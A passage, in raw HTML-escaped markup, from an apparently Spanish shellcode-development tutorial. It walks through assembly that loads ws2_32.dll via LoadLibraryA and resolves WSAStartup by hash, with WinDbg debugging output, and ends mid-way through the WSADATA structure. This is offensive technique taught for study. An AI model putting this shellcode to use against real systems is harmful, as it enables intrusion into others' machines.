&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x18];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llama a LoadLibraryA
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Primero haremos que EAX valga nulo, luego movemos el final de la cadena de &lt;code&gt;ws2_32.dll&lt;&#x2F;code&gt; a AX y la insertamos en la pila, esto garantiza que nuestra cadena termine en null evitano bytes nulos.&lt;&#x2F;p&gt;
&lt;p&gt;Las dos instrucciones siguiente hace que la cadena completa se inserte en la pila, y después inserta ESP ya que &lt;code&gt;LoadLibraryA&lt;&#x2F;code&gt; requiere un puntero a la cadena que se encuentra actualmente en la pila.&lt;&#x2F;p&gt;
&lt;p&gt;Finalmente llamamos a &lt;code&gt;LoadLibraryA&lt;&#x2F;code&gt; y pasamos a la función &lt;code&gt;resolve_symbols_ws2_32&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;resolve_symbols_ws2_32:&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	&amp;quot;mov ebx, eax;&amp;quot;            # Mueve la dirección base de ws2_32.dll a ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	&amp;quot;push 0x3bfcedcb;&amp;quot;         # WSAStartup hash
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	&amp;quot;call dword ptr [ebp+0x04];&amp;quot; # llama a  find_function
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	&amp;quot;mov [ebp+0x20], eax;&amp;quot;     # Guarda WSAStartup para despues
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Esta función reutiliza nuestra implementación de &lt;code&gt;find_function&lt;&#x2F;code&gt; para resolver símbolos de ws2_32.dll. Pero primero, necesitamos configurar el registro EBX a la dirección base de ws2_32.dll.&lt;&#x2F;p&gt;
&lt;p&gt;El valor de retorno de &lt;strong&gt;LoadLibraryA&lt;&#x2F;strong&gt; es un identificador del módulo especificado como argumento. Este identificador se presenta en forma de la dirección base del módulo. Si la llamada a LoadLibraryA se realiza correctamente, deberíamos tener la dirección base de ws2_32.dll en el registro EAX, lo que nos permitirá moverlo a EBX mediante una simple instrucción &lt;code&gt;mov&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Con la dirección base de ws2_32.dll en EBX, enviamos los hashes individuales para cada símbolo requerido. En nuestro caso, comenzamos con WSAStartup y llamamos a find_function para resolverlos.&lt;&#x2F;p&gt;
&lt;p&gt;Estableceremos un punto de interrupción justo al principio de &lt;code&gt;load_ws2_32.dll&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=769b7570 ebx=76990000 ecx=00000000 edx=01910000 esi=01910030 edi=010923e8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=019100a0 esp=02f3f5c0 ebp=02f3f7dc iopl=0         nv up ei pl nz na po nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100a0 31c0            xor     eax,eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u  019100a0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100a0 31c0            xor     eax,eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100a2 66b86c6c        mov     ax,6C6Ch
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100a6 50              push    eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100a7 6833322e64      push    642E3233h
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100ac 687773325f      push    5F327377h
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100b1 54              push    esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100b2 ff5518          call    dword ptr [ebp+18h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100b5 89c3            mov     ebx,eax
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Continuamos hasta &lt;code&gt;call    dword ptr [ebp+18h]&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00006c6c ebx=76990000 ecx=00000000 edx=01910000 esi=01910030 edi=010923e8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=019100b2 esp=02f3f5b0 ebp=02f3f7dc iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100b2 ff5518          call    dword ptr [ebp+18h]  ss:0023:02f3f7f4={KERNEL32!LoadLibraryAStub (769b9950)}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; da poi(esp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;02f3f5b4  &amp;quot;ws2_32.dll&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Pasamos por encima la función y comprobamos que &lt;code&gt;eax&lt;&#x2F;code&gt;, contiene la dirección de inicio de &lt;code&gt;ws2_32.dll&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u  019100b1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100b1 54              push    esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100b2 ff5518          call    dword ptr [ebp+18h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100b5 89c3            mov     ebx,eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=77350000 ebx=76990000 ecx=00000000 edx=01090000 esi=01910030 edi=010923e8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=019100b5 esp=02f3f5b4 ebp=02f3f7dc iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100b5 89c3            mov     ebx,eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; r eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=77350000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; lm m ws2_32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Browse full module list
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start    end        module name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77350000 773b3000   WS2_32     (deferred)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Después de pasar por la llamada vemos que el argumento está configurado correctamente antes de la llamada a &lt;code&gt;LoadLibraryA&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Finalmente, debemos asegurarnos de que nuestra implementación de &lt;code&gt;find_function&lt;&#x2F;code&gt; funcione con &lt;code&gt;ws2_32.dll&lt;&#x2F;code&gt;. Repasemos las instrucciones para llegar a la instrucción &lt;code&gt;push&lt;&#x2F;code&gt; que coloca el hash de &lt;code&gt;WSAStartup&lt;&#x2F;code&gt; en la pila y luego llamemos a &lt;code&gt;find_function&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=77350000 ebx=77350000 ecx=00000000 edx=01090000 esi=01910030 edi=010923e8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=019100b7 esp=02f3f5b4 ebp=02f3f7dc iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100b7 68cbedfc3b      push    3BFCEDCBh
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=77350000 ebx=77350000 ecx=00000000 edx=01090000 esi=01910030 edi=010923e8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=019100bc esp=02f3f5b0 ebp=02f3f7dc iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100bc ff5504          call    dword ptr [ebp+4]    ss:0023:02f3f7e0=01910030
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=77359cc0 ebx=77350000 ecx=00000000 edx=01090000 esi=01910030 edi=010923e8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=019100bf esp=02f3f5b0 ebp=02f3f7dc iopl=0         nv up ei pl nz na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;019100bf 894520          mov     dword ptr [ebp+20h],eax ss:0023:02f3f7fc=00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; r eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=77359cc0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u @eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;WS2_32!WSAStartup:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77359cc0 8bff            mov     edi,edi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77359cc2 55              push    ebp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77359cc3 8bec            mov     ebp,esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77359cc5 6afe            push    0FFFFFFFEh
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77359cc7 68f8363977      push    offset WS2_32!StringCopyWorkerW+0x3b1 (773936f8)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77359ccc 68807b3677      push    offset WS2_32!_except_handler4 (77367b80)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77359cd1 64a100000000    mov     eax,dword ptr fs:[00000000h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77359cd7 50              push    eax
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En el snippet anterior podemos ver como se inserta la dirección en la pila con &lt;code&gt;push&lt;&#x2F;code&gt;, después se recupera la dirección de find_funcion guardada en &lt;code&gt;ebp-4&lt;&#x2F;code&gt; y vemos como &lt;code&gt;eax&lt;&#x2F;code&gt;, contiene la dirección de &lt;code&gt;WSAStartup&lt;&#x2F;code&gt; antes de guardarse.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;llamada-a-wsastartup&quot;&gt;LLamada a WSAStartup&lt;a class=&quot;zola-anchor&quot; href=&quot;#llamada-a-wsastartup&quot; aria-label=&quot;Anchor link for: llamada-a-wsastartup&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Como se mencionó anteriormente, la primera API que debemos llamar es WSAStartup para que nuestro shellcode inicie el uso de la DLL de &lt;strong&gt;Winsock&lt;&#x2F;strong&gt; . Analicemos el prototipo de la función:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function z-c++&quot;&gt;&lt;span class=&quot;z-meta z-toc-list z-full-identifier z-c++&quot;&gt;&lt;span class=&quot;z-entity z-name z-function z-c++&quot;&gt;WSAStartup&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c++&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;wVersionRequired&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;LPWSADATA lpWSAData
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c++&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El primer parámetro parece ser la versión de la especificación de Windows Sockets. Lo estableceremos en &quot;2.2&quot;.&lt;&#x2F;p&gt;
&lt;p&gt;Podemos obtener más información sobre otras versiones disponibles en la documentación oficial. El segundo parámetro es un puntero a la estructura &lt;code&gt;WSADATA&lt;&#x2F;code&gt; . Según Microsoft, esta estructura recibirá información sobre la implementación de Windows Sockets.&lt;&#x2F;p&gt;
&lt;p&gt;Necesitamos reservar espacio para esta estructura, así que determinemos su longitud revisando su prototipo e inspeccionando el tamaño de cada miembro.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-storage z-type z-c++&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c++&quot;&gt;struct&lt;&#x2F;span&gt; WSAData &lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c++&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt; wVersion&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt; wHighVersion&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#if&lt;&#x2F;span&gt; ...
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;unsigned&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;short&lt;&#x2F;span&gt; iMaxSockets&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#if&lt;&#x2F;span&gt; ...
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;unsigned&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;short&lt;&#x2F;span&gt; iMaxUdpDg&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#if&lt;&#x2F;span&gt; ...
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;char&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;lpVendorInfo&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#if&lt;&#x2F;span&gt; ...
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;char&lt;&#x2F;span&gt; szDescription&lt;span class=&quot;z-meta z-brackets z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c++&quot;&gt;[&lt;&#x2F;span&gt;WSADESCRIPTION_LEN &lt;span class=&quot;z-keyword z-operator z-arithmetic z-c&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c++&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c++&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#if&lt;&#x2F;span&gt; ...
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;char&lt;&#x2F;span&gt; szSystemStatus&lt;span class=&quot;z-meta z-brackets z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c++&quot;&gt;[&lt;&#x2F;span&gt;WSASYS_STATUS_LEN &lt;span class=&quot;z-keyword z-operator z-arithmetic z-c&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c++&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c++&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#else&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;char&lt;&#x2F;span&gt; szDescription&lt;span class=&quot;z-meta z-brackets z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c++&quot;&gt;[&lt;&#x2F;span&gt;WSADESCRIPTION_LEN &lt;span class=&quot;z-keyword z-operator z-arithmetic z-c&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c++&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c++&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#endif&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#else&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;char&lt;&#x2F;span&gt; szSystemStatus&lt;span class=&quot;z-meta z-brackets z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c++&quot;&gt;[&lt;&#x2F;span&gt;WSASYS_STATUS_LEN &lt;span class=&quot;z-keyword z-operator z-arithmetic z-c&quot;&gt;+&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c++&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c++&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#endif&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#else&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;unsigned&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;short&lt;&#x2F;span&gt; iMaxSockets&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
